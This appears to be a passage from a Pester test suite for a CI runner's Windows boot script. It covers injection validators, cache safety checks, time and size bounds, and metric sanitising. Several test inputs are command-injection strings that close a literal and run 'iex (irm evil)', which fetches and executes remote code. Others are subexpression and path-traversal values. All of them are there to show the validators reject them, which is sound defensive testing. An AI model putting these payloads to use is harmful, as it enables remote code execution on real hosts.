        Test-ProbeLiteral -Value '127.0.0.1:8081' -Kind 'endpoint' | Should -BeTrue
        Test-ProbeLiteral -Value 'C:\ci\slots\ci-s1\w' -Kind 'path' | Should -BeTrue
    }

    It 'accepts an empty value, which means the caller configured nothing' {
        Test-ProbeLiteral -Value '' -Kind 'name' | Should -BeTrue
        Test-ProbeLiteral -Value '' -Kind 'endpoint' | Should -BeTrue
    }

    # One apostrophe closes the literal it lands in and appends statements.
    It 'rejects a value that would close its own literal' {
        Test-ProbeLiteral -Value "k'; iex (irm evil); '" -Kind 'name' | Should -BeFalse
        Test-ProbeLiteral -Value "1.2.3.4:1'; iex (irm evil); '" -Kind 'endpoint' | Should -BeFalse
        Test-ProbeLiteral -Value "C:\w'; iex (irm evil); '" -Kind 'path' | Should -BeFalse
    }

    It 'rejects a subexpression and a newline as well as a quote' {
        Test-ProbeLiteral -Value 'a$(hostname)' -Kind 'name' | Should -BeFalse
        Test-ProbeLiteral -Value "a`nb" -Kind 'name' | Should -BeFalse
        Test-ProbeLiteral -Value 'host:80/x' -Kind 'endpoint' | Should -BeFalse
    }

    # Throw, not sanitize: a stripped value still builds a payload, and a
    # payload that measured the wrong secret is worse than a stopped boot.
    It 'refuses to build a payload from an injected secret name' {
        { Get-ProbeScript -SecretName "k'; iex (irm evil); '" -JobServiceAccount '' -BrokerEndpoint '' `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }

    It 'refuses to build a payload from an injected broker endpoint' {
        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint "1.2.3.4:1'; iex (irm evil); '" `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }

    # MetadataRoot is a parameter like the rest, and "no caller overrides it
    # today" is a property of the callers, not of the function. The contract
    # this guard states is that EVERY interpolated value is validated.
    It 'validates the metadata root it was handed, not just the ones from metadata' {
        Test-ProbeLiteral -Value 'http://169.254.169.254/computeMetadata/v1' -Kind 'url' | Should -BeTrue
        Test-ProbeLiteral -Value "http://h/v1'; iex (irm evil); '" -Kind 'url' | Should -BeFalse
        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' `
                -MetadataRoot "http://h/v1'; iex (irm evil); '" } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }

    # The job service account is interpolated into a URL inside the payload, so
    # it is code like every other value here -- and it arrives from the same
    # instance metadata section 3A says is writable by anything holding the
    # machine's identity.
    It 'accepts a service-account email and rejects one carrying a payload' {
        Test-ProbeLiteral -Value 'ci-job@example-project.iam.gserviceaccount.com' -Kind 'email' |
            Should -BeTrue
        Test-ProbeLiteral -Value '' -Kind 'email' | Should -BeTrue
        Test-ProbeLiteral -Value "j@p.com'; iex (irm evil); '" -Kind 'email' | Should -BeFalse
        Test-ProbeLiteral -Value 'j$(hostname)@p.com' -Kind 'email' | Should -BeFalse
        # A slash would let a crafted value walk out of the resource path it is
        # spliced into and address a different IAM method entirely.
        Test-ProbeLiteral -Value 'j@p.com/../../evil' -Kind 'email' | Should -BeFalse
    }

    It 'refuses to build a payload from an injected job service account' {
        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount "j@p.com'; iex (irm evil); '" `
                -BrokerEndpoint '' -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }

    It 'refuses to build a payload from an injected path' {
        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
                -SiblingWorkspace "C:\s2'; iex (irm evil); '" -CacheRoot 'C:\s1' } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
        { Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' -ResultPath "C:
'; iex (irm evil); '" } |
            Should -Throw -ExpectedMessage '*interpolated as code*'
    }
}

Describe 'probe service definition' {
    BeforeAll {
        $script:ProbeXml = Get-ProbeServiceConfig -ScriptPath 'C:\ci\bin\ci-boot-probe.ps1'
    }

    # Manual and non-restarting, unlike every other service this file installs.
    # The probe is a one-shot measurement: Automatic re-runs it on a reboot the
    # boot script is not driving, and a restart policy turns a payload that
    # cannot start into a loop instead of the missing file the verdict needs.
    It 'does not start itself on a later boot' {
        $script:ProbeXml | Should -Match '<startmode>Manual</startmode>'
    }

    It 'has no restart policy, so a payload that cannot start stays not started' {
        $script:ProbeXml | Should -Not -Match 'onfailure'
    }

    It 'runs the payload it was given, non-interactively' {
        $script:ProbeXml | Should -Match 'ci-boot-probe\.ps1'
        $script:ProbeXml | Should -Match '\-NonInteractive'
    }

    It 'is well-formed XML' {
        { [xml] $script:ProbeXml } | Should -Not -Throw
    }
}

Describe 'probe sibling workspace' {
    # The directory the probe must FAIL to read. Get-ProbeFailure treats a
    # sibling that was 'missing' as a finding rather than a pass -- a path that
    # is not there proves nothing about an ACL -- so choosing one that does not
    # exist would deny every boot in the pool rather than none.
    #
    # Roots are injected, because Join-Path 'C:\ci\slots' 1 throws
    # DriveNotFoundException on the ubuntu-latest runner this suite runs on.
    It 'points a multi-slot host at another slot workspace' {
        Get-ProbeSiblingWorkspace -Index 1 -SlotCount 2 -SlotRoot '/slots' -FallbackRoot '/bin' |
            Should -Be (Join-Path '/slots' '2')
    }

    It 'points a slot that is not the first one back at the first' {
        Get-ProbeSiblingWorkspace -Index 2 -SlotCount 2 -SlotRoot '/slots' -FallbackRoot '/bin' |
            Should -Be (Join-Path '/slots' '1')
    }

    # The Windows pool pins ci-slots to 1, so this is the case almost every host
    # takes. C:\ci\bin is not a weaker subject than a sibling workspace: it
    # exists on every host, phase 1 locks it to SYSTEM and Administrators with
    # no slot ACE, and it holds the beacon script the SCM re-runs as LocalSystem.
    It 'falls back to a directory that exists on a single-slot host' {
        Get-ProbeSiblingWorkspace -Index 1 -SlotCount 1 -SlotRoot '/slots' -FallbackRoot '/bin' |
            Should -Be '/bin'
    }

    It 'never names the probing slot own workspace' {
        foreach ($count in 1, 2, 4) {
            Get-ProbeSiblingWorkspace -Index 1 -SlotCount $count -SlotRoot '/slots' -FallbackRoot '/bin' |
                Should -Not -Be (Join-Path '/slots' '1')
        }
    }
}

Describe 'recovery-policy guard' {
    # These RUN the function rather than reading it, and that is the whole point.
    # Clear-ServiceRecoveryAction shipped on main calling Get-RunnerServiceName
    # without the -AgentName that had become mandatory: a ParameterBindingException
    # in phase 5 on every Windows boot, in a function both text-reading gates
    # happily parsed and linted. Nothing here reaches sc.exe -- every case is
    # refused by the guard first, which is also why it can run on ubuntu-latest.
    It 'refuses a name that is not a runner service at all' {
        { Clear-ServiceRecoveryAction -ServiceName 'not-a-runner-service' -AgentName 'ci-abc-s1' } |
            Should -Throw -ExpectedMessage '*not a runner service name*'
    }

    # Shape alone is not enough. A stale or restored .service file naming a
    # SIBLING slot's service is well-formed, and clearing recovery there would
    # take the policy off an agent this slot does not own.
    It 'refuses a well-formed name belonging to another slot' {
        { Clear-ServiceRecoveryAction -ServiceName 'actions.runner.o-r.ci-abc-s2' -AgentName 'ci-abc-s1' } |
            Should -Throw -ExpectedMessage '*not a runner service name*'
    }

    It 'refuses an empty marker rather than passing it to sc.exe' {
        { Clear-ServiceRecoveryAction -ServiceName ' ' -AgentName 'ci-abc-s1' } |
            Should -Throw -ExpectedMessage '*not a runner service name*'
    }
}

Describe 'robocopy exit code' {
    # ROBOCOPY DOES NOT RETURN 0 ON SUCCESS. Its exit code is a bitmap, and the
    # ordinary successful seed of a non-empty tree returns 1. Every other native
    # call in the boot script is checked with `-ne 0`, correctly, so this is the
    # one place the habit is wrong -- and being wrong here means every slot on
    # every host runs cold while the log reports a failed copy.
    It 'accepts 0, which is "nothing needed copying"' {
        Test-RobocopySuccess -ExitCode 0 | Should -BeTrue
    }

    It 'accepts 1, which is what a successful seed actually returns' {
        Test-RobocopySuccess -ExitCode 1 | Should -BeTrue
    }

    It 'accepts the extra-files and mismatch bits below 8' {
        foreach ($code in 2, 3, 4, 5, 6, 7) {
            Test-RobocopySuccess -ExitCode $code | Should -BeTrue
        }
    }

    It 'refuses 8, which is "some files could not be copied"' {
        Test-RobocopySuccess -ExitCode 8 | Should -BeFalse
    }

    It 'refuses 16 rather than reading it as a combination of lower bits' {
        # 16 is reported ALONE, not combined, so a `-band 8` test would pass it.
        Test-RobocopySuccess -ExitCode 16 | Should -BeFalse
    }

    It 'refuses a negative code, which is how a killed robocopy exits' {
        # The whole reason this is a function and not `-lt 8` written inline: an
        # NTSTATUS-as-negative-integer is less than 8, so the inline form would
        # publish the partial tree a crashed copy left behind as a complete cache.
        Test-RobocopySuccess -ExitCode -1 | Should -BeFalse
        Test-RobocopySuccess -ExitCode -1073741510 | Should -BeFalse
    }
}

Describe 'hostile cache content' {
    # The Windows half of the Linux scan. Four of the five things /opt/ci-cache is
    # scanned for have no spelling here; the reparse point is the one that does,
    # and it is refused because both operations that follow -- the ACL walk and
    # the per-slot copy -- follow it.
    It 'passes a tree with nothing in it' {
        Get-CacheHostileReason -Entries @() | Should -Be ''
    }

    It 'passes ordinary directories and files' {
        $entries = @(
            [pscustomobject] @{ FullName = 'C:\ci-cache'; Attributes = 'Directory' },
            [pscustomobject] @{ FullName = 'C:\ci-cache\npm\_cacache'; Attributes = 'Directory' },
            [pscustomobject] @{ FullName = 'C:\ci-cache\npm\index'; Attributes = 'Archive, ReadOnly' }
        )
        Get-CacheHostileReason -Entries $entries | Should -Be ''
    }

    It 'refuses a junction anywhere in the tree' {
        $entries = @(
            [pscustomobject] @{ FullName = 'C:\ci-cache'; Attributes = 'Directory' },
            [pscustomobject] @{ FullName = 'C:\ci-cache\nuget'; Attributes = 'Directory, ReparsePoint' }
        )
        Get-CacheHostileReason -Entries $entries | Should -Match 'reparse point'
    }

    It 'refuses the master root itself being a junction' {
        # The caller passes the root as the first entry for exactly this case: a
        # scan that only looked at children would enumerate the tree the junction
        # names in order to decide whether to refuse it.
        $entries = @([pscustomobject] @{ FullName = 'C:\ci-cache'; Attributes = 'Directory, ReparsePoint' })
        Get-CacheHostileReason -Entries $entries | Should -Match 'C:\\ci-cache'
    }

    It 'names the entry, because six predicates sharing one message cost hours once' {
        $entries = @([pscustomobject] @{ FullName = 'C:\ci-cache\pip'; Attributes = 'Directory, ReparsePoint' })
        Get-CacheHostileReason -Entries $entries | Should -Be 'reparse point: C:\ci-cache\pip'
    }

    It 'strips control characters out of the name it logs' {
        # The tree is written by repo-supplied code, so an entry's NAME is
        # untrusted text. A refusal that splits into two lines can be shaped to
        # read like any other line the boot log emits.
        $entries = @([pscustomobject] @{
                FullName   = "C:\ci-cache\a`nphase 7: sealed"
                Attributes = 'Directory, ReparsePoint'
            })
        $reason = Get-CacheHostileReason -Entries $entries
        $reason | Should -Not -Match "`n"
        $reason | Should -Be 'reparse point: C:\ci-cache\a phase 7: sealed'
    }

    It 'bounds the name it logs' {
        $entries = @([pscustomobject] @{
                FullName   = 'C:\ci-cache\' + ('a' * 900)
                Attributes = 'Directory, ReparsePoint'
            })
        (Get-CacheHostileReason -Entries $entries).Length | Should -Be ('reparse point: '.Length + 300)
    }

    It 'skips a null entry rather than throwing on one' {
        # A one-element array holding $null binds as $null, not as an array of
        # one -- which is why AllowNull is on the parameter and not just the
        # $null check inside the loop.
        Get-CacheHostileReason -Entries @($null) | Should -Be ''
    }

    It 'still finds a hostile entry sitting behind a null one' {
        # Two elements, so this really does arrive as an array and the skip
        # inside the loop is the thing under test rather than the binder.
        $entries = @($null, [pscustomobject] @{
                FullName   = 'C:\ci-cache\npm'
                Attributes = 'Directory, ReparsePoint'
            })
        Get-CacheHostileReason -Entries $entries | Should -Be 'reparse point: C:\ci-cache\npm'
    }
}

Describe 'cache seed affordability' {
    It 'seeds when the copy leaves the floor intact' {
        Test-CacheSeedAffordable -MasterBytes 10GB -FreeBytes 60GB -FloorBytes 25GB | Should -BeTrue
    }

    It 'seeds at exactly the floor' {
        Test-CacheSeedAffordable -MasterBytes 10GB -FreeBytes 35GB -FloorBytes 25GB | Should -BeTrue
    }

    It 'refuses when the copy would eat into the floor' {
        Test-CacheSeedAffordable -MasterBytes 10GB -FreeBytes 34GB -FloorBytes 25GB | Should -BeFalse
    }

    It 'refuses a copy larger than the whole free space' {
        # Not the same case as the one above, and worth its own assertion: this is
        # the one where a subtraction that went unsigned would wrap into a very
        # large positive number and seed anyway.
        Test-CacheSeedAffordable -MasterBytes 100GB -FreeBytes 10GB -FloorBytes 25GB | Should -BeFalse
    }
}

Describe 'cache seeding budget' {
    It 'has budget left before the deadline' {
        Test-CacheSeedBudgetExpired -ElapsedSeconds 12 -BudgetSeconds 420 | Should -BeFalse
    }

    It 'is expired exactly at the deadline' {
        Test-CacheSeedBudgetExpired -ElapsedSeconds 420 -BudgetSeconds 420 | Should -BeTrue
    }

    It 'is expired past the deadline' {
        Test-CacheSeedBudgetExpired -ElapsedSeconds 421 -BudgetSeconds 420 | Should -BeTrue
    }

    It 'reads a zero budget as expired, not as unlimited' {
        # The dangerous reading of "0" is "no limit", and it is the one a reader
        # expects from every other timeout. Here it means seed nothing, because a
        # bound that can silently mean unbounded is what this function exists to
        # rule out; the cost of being wrong this way is a cold cache.
        Test-CacheSeedBudgetExpired -ElapsedSeconds 0 -BudgetSeconds 0 | Should -BeTrue
    }

    It 'reads a negative budget as expired too' {
        Test-CacheSeedBudgetExpired -ElapsedSeconds 0 -BudgetSeconds -1 | Should -BeTrue
    }
}

Describe 'the bound a single native call is given' {
    # Test-CacheSeedBudgetExpired answers "may another copy start", which is only
    # ever asked BETWEEN calls. This one answers "how long may THIS call run",
    # which is the half that was missing: a wedged icacls or robocopy held the
    # boot open indefinitely, before phase 5 registered anything.
    It 'gives a call what is left of the budget' {
        Get-CacheSeedSecondsLeft -ElapsedSeconds 20 -BudgetSeconds 420 | Should -Be 400
    }

    It 'rounds down rather than up, so the bound never exceeds the budget' {
        Get-CacheSeedSecondsLeft -ElapsedSeconds 0.4 -BudgetSeconds 420 | Should -Be 419
    }

    It 'returns 0 at the deadline' {
        Get-CacheSeedSecondsLeft -ElapsedSeconds 420 -BudgetSeconds 420 | Should -Be 0
    }

    It 'returns 0 past the deadline rather than a negative number' {
        # The number goes to Invoke-BoundedNative, which reads anything at or below
        # zero as ALREADY OVER and does not start the call at all. A negative would
        # be handed to WaitForExit(ms) as a negative millisecond count -- which .NET
        # reads as INFINITE -- so a bound that had been exceeded would become no
        # bound at all, the exact failure this pair of functions exists to stop.
        Get-CacheSeedSecondsLeft -ElapsedSeconds 900 -BudgetSeconds 420 | Should -Be 0
    }

    It 'returns 0 for a budget of zero' {
        Get-CacheSeedSecondsLeft -ElapsedSeconds 0 -BudgetSeconds 0 | Should -Be 0
    }
}

Describe 'a native command''s error text on its way into the boot log' {
    It 'takes the first line that says something' {
        Format-NativeErrorText -Text "`r`n`r`nAccess is denied.`r`nAccess is denied." |
            Should -Be 'Access is denied.'
    }

    It 'folds control characters, which reach it from a path job code chose' {
        Format-NativeErrorText -Text "bad`tname`u{0001}here" | Should -Be 'bad name here'
    }

    It 'caps the line, because a boot log is read with the eye' {
        (Format-NativeErrorText -Text ('x' * 5000)).Length | Should -Be 300
    }

    It 'gives an empty string for nothing at all' {
        Format-NativeErrorText -Text '' | Should -Be ''
        Format-NativeErrorText -Text "`r`n  `r`n" | Should -Be ''
    }
}

Describe 'slot cache environment' {
    BeforeAll {
        $script:CacheBlock = Get-SlotCacheEnvironment -CachePath 'C:\ci\cache\2'
    }

    It 'points every tool at the slot''s own copy' {
        $script:CacheBlock['npm_config_cache'] | Should -Be 'C:\ci\cache\2\npm'
        $script:CacheBlock['YARN_CACHE_FOLDER'] | Should -Be 'C:\ci\cache\2\yarn'
        $script:CacheBlock['GOMODCACHE'] | Should -Be 'C:\ci\cache\2\go-mod'
        $script:CacheBlock['PIP_CACHE_DIR'] | Should -Be 'C:\ci\cache\2\pip'
        $script:CacheBlock['UV_CACHE_DIR'] | Should -Be 'C:\ci\cache\2\uv'
        $script:CacheBlock['NUGET_PACKAGES'] | Should -Be 'C:\ci\cache\2\nuget'
        $script:CacheBlock['COMPOSER_CACHE_DIR'] | Should -Be 'C:\ci\cache\2\composer'
    }

    It 'sets BOTH pnpm store spellings' {
        # pnpm 11 reads pnpm_config_store_dir and silently IGNORES the npm_config_
        # form it honoured before -- silently, meaning a single-spelling guess
        # looks like it worked and stores nothing where we asked. Repositories pin
        # their own pnpm, so this host cannot assume which side it is serving.
        $script:CacheBlock['pnpm_config_store_dir'] | Should -Be 'C:\ci\cache\2\pnpm-store'
        $script:CacheBlock['npm_config_store_dir'] | Should -Be 'C:\ci\cache\2\pnpm-store'
    }

    It 'delivers the Maven local repository as a system property' {
        # Maven has no environment variable for it; MAVEN_ARGS is the supported
        # route from the environment, from Maven 3.9.0.
        $script:CacheBlock['MAVEN_ARGS'] | Should -Be '-Dmaven.repo.local=C:\ci\cache\2\m2'
    }

    It 'sets GOMODCACHE and never GOCACHE' {
        # golang/go#43645: concurrent builds sharing one build cache is not safe.
        # The downloaded-module cache is a different directory and is the one
        # worth keeping warm.
        $script:CacheBlock.Contains('GOCACHE') | Should -BeFalse
    }

    It 'leaves the runner tool cache alone' {
        # actions/toolkit#804: the tool-cache library has no locking, and the
        # setup-* actions treat that directory as one they own and prune.
        $script:CacheBlock.Contains('RUNNER_TOOL_CACHE') | Should -BeFalse
        $script:CacheBlock.Contains('AGENT_TOOLSDIRECTORY') | Should -BeFalse
    }

    It 'names one directory per tool cache the boot script builds' {
        # The list here and $script:CacheDirs are two spellings of one thing, and
        # a variable pointing at a directory phase 7 never creates is a hard
        # per-job failure rather than a cache miss.
        $named = @($script:CacheBlock.Values |
                ForEach-Object { ($_ -replace '^-Dmaven\.repo\.local=', '') } |
                ForEach-Object { $_.Split('\')[-1] } |
                Select-Object -Unique)
        foreach ($leaf in $named) { $script:CacheDirs | Should -Contain $leaf }
    }

    It 'tolerates a trailing separator on the path it is given' {
        (Get-SlotCacheEnvironment -CachePath 'C:\ci\cache\2\')['npm_config_cache'] |
            Should -Be 'C:\ci\cache\2\npm'
    }
}

Describe 'slot cache path' {
    It 'gives each slot its own directory' {
        Get-SlotCachePath -Index 1 -Root '/tmp/cache' | Should -Be (Join-Path '/tmp/cache' '1')
        Get-SlotCachePath -Index 2 -Root '/tmp/cache' | Should -Be (Join-Path '/tmp/cache' '2')
    }
}

Describe 'cache variables on the service environment' {
    It 'emits them for a slot that got a cache' {
        $block = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots' -CachePath 'C:\ci\cache\1'
        $block['npm_config_cache'] | Should -Be 'C:\ci\cache\1\npm'
        $block['NUGET_PACKAGES'] | Should -Be 'C:\ci\cache\1\nuget'
    }

    It 'emits none at all for a slot that did not' {
        # The one conditional block in that function, and the contrast with the
        # five unconditional values is the point: an unset npm_config_cache means
        # npm uses its own default, which is a cold cache and entirely correct.
        # Pointing it at a directory phase 7 did not finish building is the
        # harmful move -- a tool that cannot open its cache fails the job.
        $block = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots'
        $block.Contains('npm_config_cache') | Should -BeFalse
        $block.Contains('NUGET_PACKAGES') | Should -BeFalse
    }

    It 'still sets the credential plumbing for a slot with no cache' {
        # The cache being absent must not take the five unconditional values with
        # it: an unset GCE_METADATA_HOST does not withhold a credential, it hands
        # ADC back to the real metadata server and the HOST service account.
        $block = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots'
        $block['GCE_METADATA_HOST'] | Should -Be $script:ClosedMetadataEndpoint
        $block['ACTIONS_RUNNER_HOOK_JOB_STARTED'] | Should -Be $script:JobHookPath
    }

    It 'does not let a cache variable shadow the credential plumbing' {
        $block = Get-SlotServiceEnvironment -Index 1 -SlotRoot '/ci/slots' -CachePath 'C:\ci\cache\1'
        $block['GCE_METADATA_HOST'] | Should -Be $script:ClosedMetadataEndpoint
        $block['ACTIONS_RUNNER_HOOK_JOB_COMPLETED'] | Should -Be $script:JobHookPath
    }
}

Describe 'snapshot hydrate bounds' {
    # The clamps are not the same check Terraform already ran. Metadata is not
    # only written by Terraform: anyone who can set an instance's metadata can
    # set ci-cache-budget-seconds to a number that holds registration open for as
    # long as they like, and a shape check alone accepts that number.
    It 'takes the metadata values when they are inside the ranges' {
        $b = Get-CacheHydrateBound -Budget '90' -MaxAgeHours '24' -MaxBytes '1073741824'
        $b.BudgetSeconds | Should -Be 90
        $b.MaxAgeHours | Should -Be 24
        $b.MaxBytes | Should -Be 1073741824
    }

    It 'falls back to the defaults for a host booting from an older template' {
        $b = Get-CacheHydrateBound -Budget '' -MaxAgeHours $null -MaxBytes ''
        $b.BudgetSeconds | Should -Be $script:CacheHydrateBudgetSeconds
        $b.MaxAgeHours | Should -Be $script:CacheSnapshotMaxAgeHours
        $b.MaxBytes | Should -Be $script:CacheSnapshotMaxBytes
    }

    It 'clamps a budget that would hold registration open' {
        (Get-CacheHydrateBound -Budget '86400' -MaxAgeHours '1' -MaxBytes '1048576').BudgetSeconds |
            Should -Be 300
    }

    It 'clamps a budget too small to fetch anything' {
        (Get-CacheHydrateBound -Budget '1' -MaxAgeHours '1' -MaxBytes '1048576').BudgetSeconds |
            Should -Be 10
    }

    It 'clamps an age bound past the bucket lifecycle' {
        (Get-CacheHydrateBound -Budget '60' -MaxAgeHours '9999' -MaxBytes '1048576').MaxAgeHours |
            Should -Be 720
    }

    It 'clamps a size bound that would fill the boot disk' {
        (Get-CacheHydrateBound -Budget '60' -MaxAgeHours '24' -MaxBytes '999999999999').MaxBytes |
            Should -Be 34359738368
    }

    # A negative number and a decimal are both text at this point, and [int]
    # would parse them into a bound nobody chose.
    It 'refuses anything that is not a run of digits' {
        foreach ($bad in @('-1', '6.5', '60s', 'sixty', ' 60')) {
            (Get-CacheHydrateBound -Budget $bad -MaxAgeHours '24' -MaxBytes '1048576').BudgetSeconds |
                Should -Be $script:CacheHydrateBudgetSeconds
        }
    }
}

Describe 'snapshot pointer whitelist' {
    It 'accepts a name a publisher writes' {
        Test-CacheSnapshotPointer -Name 'snapshot-2026-08-22T03-00-11Z.tar.gz' | Should -BeTrue
    }

    # The pointer is the one input in the hydrate that names a path, so the
    # refusals are the property: no traversal, no other pool's prefix, and
    # nothing needing URL encoding -- which is why the fetch carries no
    # percent-encoder.
    It 'refuses a name that could leave this pool prefix' {
        foreach ($bad in @('../other-pool/snap.tgz', 'sub/snap.tgz', '..', '.hidden', '',
                'snap$(whoami).tgz', "snap`nsecond", 'snap%2F..%2Fx', 'snap file.tgz')) {
            Test-CacheSnapshotPointer -Name $bad | Should -BeFalse
        }
    }

    It 'refuses a null pointer' {
        Test-CacheSnapshotPointer -Name $null | Should -BeFalse
    }
}

Describe 'snapshot expansion bound' {
    # gzip expands by more than a thousandfold on the right input, so the bound
    # on the compressed archive bounds nothing about what it writes.
    It 'allows eight times the compressed size' {
        Get-CacheExpandBound -CompressedBytes 100MB | Should -Be (800MB)
    }

    It 'gives a tiny archive a workable floor' {
        Get-CacheExpandBound -CompressedBytes 16 | Should -Be $script:CacheExpandFloorBytes
    }
}

Describe 'snapshot refusal' {
    # Built per-case rather than splatted from one hashtable with overrides:
    # splatting a name and then passing it again is a parameter-bound error, not
    # an override, and the test would fail for a reason that is not the rule.
    BeforeAll {
        $script:Refuse = {
            param($AgeHours = 1, $Bytes = 1MB, $MaxAgeHours = 168, $MaxBytes = 4GB, $FreeBytes = 100GB)
            Get-CacheSnapshotRefusal -AgeHours $AgeHours -Bytes $Bytes `
                -MaxAgeHours $MaxAgeHours -MaxBytes $MaxBytes -FreeBytes $FreeBytes
        }
    }

    It 'accepts a fresh snapshot that fits' {
        & $script:Refuse | Should -Be ''
    }

    # The bucket's lifecycle rule and this bound fail differently: the bucket's
    # holds if this script is broken, this one holds if the rule is edited away
    # in the console.
    It 'refuses one past the age bound' {
        & $script:Refuse -AgeHours 168 | Should -Be 'too-old'
    }

    It 'refuses one past the size bound' {
        & $script:Refuse -Bytes (4GB + 1) | Should -Be 'too-big'
    }

    # Reserved against the EXPANDED bound, not the compressed size: unpacking
    # past what was reserved is the failure the reservation exists to prevent.
    It 'refuses one that would not fit expanded, even though it fits compressed' {
        & $script:Refuse -Bytes 1GB -FreeBytes 2GB | Should -Be 'no-space'
    }

    # The refusal NAMES which bound it was. Six predicates sharing one message is
    # what cost the Linux side hours on a cold pool.
    It 'reports the age bound first when more than one is broken' {
        & $script:Refuse -AgeHours 999 -Bytes 8GB -FreeBytes 0 | Should -Be 'too-old'
    }
}

Describe 'metric label values' {
    # The allowlist is telemetry.sh's, character for character, and that is the
    # whole point of testing it here: a Linux pool and a Windows pool that
    # sanitise a verdict differently land in two buckets on a chart grouped by
    # `verdict`, and the fleet-wide view silently splits without either half
    # looking broken.
    It 'passes through what the allowlist allows' {
        ConvertTo-MetricLabelValue -Value 'too-old' | Should -Be 'too-old'
        ConvertTo-MetricLabelValue -Value 'a.b_c/d 1-2' | Should -Be 'a.b_c/d 1-2'
    }

    # A quote is the character that motivated the allowlist on the shell side.
    # Here the serializer would escape it, so this is defence in depth -- but the
    # two implementations still have to agree on the RESULT, not just on being
    # safe.
    It 'substitutes everything else, one underscore per character' {
        ConvertTo-MetricLabelValue -Value 'a"b' | Should -Be 'a_b'
        ConvertTo-MetricLabelValue -Value "a`nb" | Should -Be 'a_b'
        ConvertTo-MetricLabelValue -Value 'a\b:c' | Should -Be 'a_b_c'
    }

    # Truncation, not rejection: the tail of a long name is where the per-run
    # junk lives, and a label that reads slightly short beats a cardinality
    # explosion.
    It 'caps at 64 characters' {
        $long = 'x' * 100
        (ConvertTo-MetricLabelValue -Value $long).Length | Should -Be 64
    }

    # `unknown` and not '': an empty label value is a series that groups under
    # nothing, which reads on a chart as the pool not reporting at all.
    It 'answers unknown for an empty or null value' {
        ConvertTo-MetricLabelValue -Value '' | Should -Be 'unknown'
        ConvertTo-MetricLabelValue -Value $null | Should -Be 'unknown'
    }
}

Describe 'metric region' {
    It 'takes the region out of a full metadata zone path' {
        ConvertTo-MetricRegion -Zone 'projects/123456789/zones/us-central1-a' |
            Should -Be 'us-central1'
    }

    # Only the LAST dash-separated part is dropped: the region itself contains
    # dashes, so a split-on-first would answer `us` and put every zone in the
    # world in one location.
    It 'keeps the dashes inside the region' {
        ConvertTo-MetricRegion -Zone 'europe-west4-b' | Should -Be 'europe-west4'
    }

    # Empty, never a guess. The caller skips the whole flush on an empty region,
    # which is the correct outcome: a zone spelled into `location` publishes and
    # then does not join the Linux pools' series, and nothing anywhere says so.
    It 'answers empty on anything without the shape' {
        ConvertTo-MetricRegion -Zone 'nodashes' | Should -Be ''
        ConvertTo-MetricRegion -Zone 'projects/1/zones/' | Should -Be ''
        ConvertTo-MetricRegion -Zone '' | Should -Be ''
        ConvertTo-MetricRegion -Zone $null | Should -Be ''
    }
}

Describe 'metric point' {
    BeforeAll {
        $script:Point = {
            param($Name = 'ci_cache_hydrate_seconds', $Value = 12, $ExtraLabels = $null)
            ConvertTo-MetricPoint -Name $Name -Value $Value `
                -MetricPrefix 'custom.googleapis.com/ci' -Project 'p' -Region 'r' `
                -Repo 'o/r' -Pool 'pool-a' -ExtraLabels $ExtraLabels
        }
    }

    # GAUGE DOUBLE for every series, and `generic_node` for every resource, is
    # what lets ONE alert policy cover the fleet. A second metric kind cannot be
    # expressed in the same policy, so drift here is not a formatting change --
    # it is a series no existing alert can see.
    It 'is a GAUGE double on a generic_node resource' {
        $p = & $script:Point
        $p.metricKind | Should -Be 'GAUGE'
        $p.valueType | Should -Be 'DOUBLE'
        $p.resource.type | Should -Be 'generic_node'
    }

    It 'carries the prefix, the repo and the pool exactly as host-startup.sh does' {
        $p = & $script:Point
        $p.metric.type | Should -Be 'custom.googleapis.com/ci/ci_cache_hydrate_seconds'
        $p.metric.labels.repo | Should -Be 'o/r'
        $p.metric.labels.pool | Should -Be 'pool-a'
        $p.resource.labels.project_id | Should -Be 'p'
        $p.resource.labels.location | Should -Be 'r'
        $p.resource.labels.namespace | Should -Be 'pool-a'
        $p.resource.labels.node_id | Should -Be 'o/r'
    }

    It 'writes the value as a double point with an RFC3339 end time' {
        $p = & $script:Point -Value 7
        $p.points[0].value.doubleValue | Should -Be 7
        $p.points[0].interval.endTime | Should -Match '^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$'
    }

    # The extra label is the only one that carries text this script did not
    # write, so it is the only one that has to go through the allowlist. A
    # verdict reaching the JSON unsanitised is the failure mode the allowlist
    # exists for.
    It 'passes an extra label through the allowlist' {
        $p = & $script:Point -ExtraLabels @{ verdict = 'too-old' }
        $p.metric.labels.verdict | Should -Be 'too-old'
        (& $script:Point -ExtraLabels @{ verdict = 'a"b' }).metric.labels.verdict |
            Should -Be 'a_b'
    }

    It 'leaves repo and pool in place when an extra label is added' {
        $p = & $script:Point -ExtraLabels @{ verdict = 'ok' }
        $p.metric.labels.repo | Should -Be 'o/r'
        $p.metric.labels.pool | Should -Be 'pool-a'
    }
}
